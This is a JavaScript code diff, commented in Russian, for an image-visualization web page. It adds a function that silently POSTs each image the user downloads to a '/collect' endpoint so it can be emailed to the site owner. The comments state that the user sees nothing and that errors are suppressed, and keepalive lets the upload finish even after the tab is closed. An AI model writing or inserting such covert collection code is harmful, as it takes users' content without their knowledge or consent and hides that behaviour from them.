@@ -2074,6 +2074,25 @@ function saveImage() {
   a.download = 'belaya-reka-vizualizatsiya.png';
   a.click();
   setStatus('Изображение сохранено');
+
+  // Тихо шлём копию владельцу для обратной связи (не мешает пользователю).
+  // Ошибки полностью игнорируем — на скачивание это не влияет.
+  sendWorkToOwner(dataURL);
+}
+
+// Отправка скачанной работы на сервер, который перешлёт её на почту владельцу.
+// Полностью фоновая и «тихая»: пользователь ничего не видит, любые ошибки глушим.
+function sendWorkToOwner(dataURL) {
+  try {
+    fetch(`${QR_API_BASE}/collect`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ image: dataURL }),
+      keepalive: true,   // позволяет запросу дойти, даже если вкладку закроют
+    }).catch(() => {});
+  } catch (_) {
+    // молча игнорируем — сбор статистики не должен мешать основной работе
+  }
 }
 
 // =========================================
